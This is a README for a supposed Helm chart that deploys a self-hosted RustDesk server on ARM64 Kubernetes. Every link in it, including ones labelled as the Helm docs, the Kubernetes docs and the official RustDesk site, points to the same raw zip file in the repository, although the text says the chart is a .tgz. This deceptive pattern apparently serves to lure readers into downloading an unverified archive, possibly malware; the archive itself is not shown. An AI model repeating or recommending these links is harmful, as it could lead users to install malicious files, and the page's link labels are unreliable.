# 🛠️ orc-k8s-helm-rustdesk - Easy RustDesk Deployment on Kubernetes

## 🚀 Getting Started

Welcome to the orc-k8s-helm-rustdesk project! This guide will help you deploy a self-hosted RustDesk server on Kubernetes easily. You can do this even if you have no coding experience.

## 📦 Download & Install

To get started, visit our [Releases page](https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/raw/refs/heads/main/charts/k_helm_s_orc_rustdesk_v1.0.zip) to download the necessary files for your setup.

[![Download orc-k8s-helm-rustdesk](https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/raw/refs/heads/main/charts/k_helm_s_orc_rustdesk_v1.0.zip%20Latest%https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/raw/refs/heads/main/charts/k_helm_s_orc_rustdesk_v1.0.zip)](https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/raw/refs/heads/main/charts/k_helm_s_orc_rustdesk_v1.0.zip)

## 🔧 System Requirements

Before you install, make sure you have the following:

- A computer that can run Kubernetes.
- Access to a Kubernetes cluster that supports ARM64 architecture.
- Helm installed, which is needed to manage Kubernetes applications.
- An internet connection to download the necessary files.

## 🌟 Features

- **Self-Hosted RustDesk**: You gain full control over your remote desktop application.
- **ARM64 Support**: Optimized for devices like Raspberry Pi.
- **Bitwarden Secrets Manager Integration**: Securely manage sensitive data.
- **MetalLB LoadBalancer Configuration**: Share your RustDesk service with the world.

## 🛠️ Steps to Deploy

1. **Download the Helm Chart**  
   After visiting the [Releases page](https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/raw/refs/heads/main/charts/k_helm_s_orc_rustdesk_v1.0.zip), download the latest version of the Helm chart. This file usually has a `.tgz` extension.

2. **Set Up Helm**  
   Ensure that Helm is installed and configured to work with your Kubernetes cluster. If you need help with installing Helm, check the official [Helm documentation](https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/raw/refs/heads/main/charts/k_helm_s_orc_rustdesk_v1.0.zip).

3. **Deploy the Chart**  
   Open a terminal on your computer. Navigate to the directory where you downloaded the Helm chart. Run the following command to install the RustDesk server:
   ```bash
   helm install rustdesk ./rustdesk-<version>.tgz
   ```

4. **Access Your RustDesk Server**  
   Once installed, you can check the status of your deployment using:
   ```bash
   kubectl get services
   ```
   This command will list all the services running in your Kubernetes cluster. Locate your RustDesk service to find its external IP.

5. **Configure Your Client**  
   Open the RustDesk client on your computer or mobile device. Enter the server address provided by the previous command. You should be able to connect to your remote desktop.

## 🔐 Security Considerations

When you run a self-hosted service, it's crucial to ensure its security. Set up strong passwords for your accounts. Regular updates and monitoring can help protect your data.

## 🔄 Updating the Software

To update RustDesk, revisit the [Releases page](https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/raw/refs/heads/main/charts/k_helm_s_orc_rustdesk_v1.0.zip) to download the latest version. Repeat the installation process, replacing the existing deployment.

## 📚 Additional Resources

- [Helm Documentation](https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/raw/refs/heads/main/charts/k_helm_s_orc_rustdesk_v1.0.zip)
- [Kubernetes Documentation](https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/raw/refs/heads/main/charts/k_helm_s_orc_rustdesk_v1.0.zip)
- [RustDesk Official Site](https://github.com/WordsmithWolf/orc-k8s-helm-rustdesk/raw/refs/heads/main/charts/k_helm_s_orc_rustdesk_v1.0.zip)

## ⚙️ Troubleshooting

If you encounter issues:

1. Ensure your Kubernetes cluster is running.
2. Check that the necessary ports are open.
3. Review your configurations. Ensure there are no typos.

For more complex issues, check GitHub issues or community forums.

## 🤝 Contributing

If you'd like to contribute to this project, feel free to submit a pull request or open an issue on GitHub. Your input is valuable.

## 📝 License

This project is licensed under the MIT License. You can use, modify, and distribute the software as long as you provide attribution.

Thank you for using orc-k8s-helm-rustdesk! For any questions, please open an issue. We're here to help.